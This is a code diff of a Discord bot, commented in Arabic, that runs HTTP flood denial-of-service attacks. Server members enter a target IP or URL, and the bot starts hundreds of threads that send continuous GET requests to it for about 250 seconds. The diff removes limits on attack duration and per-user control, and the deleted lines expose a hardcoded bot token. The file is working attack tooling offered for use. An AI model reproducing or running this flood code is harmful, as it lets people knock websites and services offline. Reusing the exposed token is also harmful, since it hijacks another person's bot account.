@@ -7,16 +7,6 @@ import random
 from threading import Thread
 import re
 import urllib.parse
-from flask import Flask
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return 'Hello World! The server is up.'
-
-def run_flask():
-    app.run(host='0.0.0.0', port=8080)
 
 # تعريف البوت
 intents = discord.Intents.default()
@@ -60,7 +50,7 @@ def extract_url_info(url):
         return None, None
 
 # دالة HTTP الخاصة بهجوم الفيضانات المحسنة
-def http(target, floodtime, user_id):
+def http(target, floodtime):
     # التعرف إذا كان الهدف رابط أو IP
     if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
         # الهدف هو IP
@@ -72,11 +62,11 @@ def http(target, floodtime, user_id):
         host, path = extract_url_info(target)
         port = 80  # افتراضي
 
-    while time.time() < floodtime and host and active_attacks.get(user_id, False):
+    while time.time() < floodtime and host:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             try:
                 sock.connect((host, port))
-                while time.time() < floodtime and active_attacks.get(user_id, False):
+                while time.time() < floodtime:
                     request = f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'
                     sock.send(request.encode())
             except:
@@ -85,7 +75,6 @@ def http(target, floodtime, user_id):
 # تعريف المتغيرات العامة
 ALLOWED_SERVER_ID = 923906395764555817
 ALLOWED_CHANNEL_ID = 1371579013373366392
-active_attacks = {}  # لتتبع الهجمات النشطة لكل مستخدم
 
 # حدث عند تشغيل البوت
 @bot.event
@@ -129,53 +118,19 @@ async def on_message(message):
 
 # أمر !go لتنفيذ الهجوم
 @bot.command()
-async def go(ctx, ip: str, port: int = 80, time_input: int = None):
+async def go(ctx, ip: str, port: int = 80):
     # التحقق الإضافي من القناة (للتأكيد)
     if ctx.channel.id != ALLOWED_CHANNEL_ID or (ctx.guild and ctx.guild.id != ALLOWED_SERVER_ID):
         print(f"أمر مرفوض: قناة {ctx.channel.id}, سيرفر {ctx.guild.id if ctx.guild else 'DM'}")
         return
 
-    # التحقق من الرتبة وضبط الوقت الأقصى
-    max_time = 95  # الوقت الافتراضي
-    role_id_1 = 1371609360295530627
-    role_id_2 = 1371609587916083200
-    
-    has_role_1 = any(role.id == role_id_1 for role in ctx.author.roles)
-    has_role_2 = any(role.id == role_id_2 for role in ctx.author.roles)
-    
-    if has_role_2:
-        max_time = 250
-    elif has_role_1:
-        max_time = 95
-    else:
-        await ctx.send("الوقت غير مسموح به أو أنك لا تمتلك الرتبة المطلوبة")
-        return
-    
-    # إذا لم يتم تحديد وقت أو تجاوز الحد الأقصى
-    if time_input is None:
-        duration = max_time
-    elif time_input > max_time:
-        await ctx.send(f"أقصى حد مسموح به هو {max_time} ثانية")
-        return
-    else:
-        duration = time_input
-
-    # إيقاف أي هجوم سابق لنفس المستخدم
-    active_attacks[ctx.author.id] = False
-    
     embed = discord.Embed(color=discord.Color.red(), description="يرجئ عدم مهاجمة المواقع الحكومية")
     embed.set_image(url="https://cdn.discordapp.com/attachments/1371211425640616119/1371489597183361176/Picsart_25-05-12_17-09-32-260.jpg?ex=682352b9&is=68220139&hm=55eced9580e288d37dd85e1e37b26072e63517178436aae4d42ba99162e33118&")
-    
     # إنشاء زر للخيارات
     button = Button(label="اختيار HTTP", style=discord.ButtonStyle.green)
 
     # عندما يضغط المستخدم على الزر
     async def on_button_click(interaction):
-        # التحقق من أن الضغط من نفس المستخدم
-        if interaction.user.id != ctx.author.id:
-            await interaction.response.send_message("هذا الزر ليس لك!", ephemeral=True)
-            return
-            
         # التحقق الإضافي من القناة (للتأكيد)
         if interaction.channel.id != ALLOWED_CHANNEL_ID or (interaction.guild and interaction.guild.id != ALLOWED_SERVER_ID):
             await interaction.response.send_message("غير مسموح باستخدام هذا الأمر هنا", ephemeral=True)
@@ -195,23 +150,11 @@ async def go(ctx, ip: str, port: int = 80, time_input: int = None):
                 return
             target = ip  # استخدام الرابط الكامل
 
-        threads = 1000  # الحد الآمن لـ Replit (بدلاً من 1000)
-        
-        # بدء الهجوم
-        active_attacks[ctx.author.id] = True
-        floodtime = time.time() + duration
-        
+        threads = 200  # الحد الآمن لـ Replit (بدلاً من 1000)
+        duration = 250  # المدة بالثواني
         for _ in range(threads):
-            Thread(target=http, args=(target, floodtime, ctx.author.id)).start()
-            
-        await interaction.response.send_message(f"تم البدء بنجاح لمدة {duration} ثانية")
-        
-        # إيقاف الهجوم بعد انتهاء المدة
-        def stop_attack():
-            time.sleep(duration)
-            active_attacks[ctx.author.id] = False
-            
-        Thread(target=stop_attack).start()
+            Thread(target=http, args=(target, time.time() + duration)).start()
+        await interaction.response.send_message(f"تم البدء بنجاح ")
 
     button.callback = on_button_click
     # إرسال الرسالة مع المنيو
@@ -219,12 +162,7 @@ async def go(ctx, ip: str, port: int = 80, time_input: int = None):
     view.add_item(button)
     await ctx.send(embed=embed, view=view)
 
-# تشغيل الخادم والبوت في خيوط منفصلة
+# تشغيل البوت بعد طلب التوكن
 if __name__ == '__main__':
-    # تشغيل الخادم في خيط منفصل
-    import threading
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
-    
-    # تشغيل البوت
-    bot.run('MTM2MzUyMDc2MDA2MDA1MTQ3Nw.GTe_aT.SWI_4JLunv8wAwoDysH3pMUIivBeEPoPf446G8')
+    token = input("token : ")
+    bot.run(token)
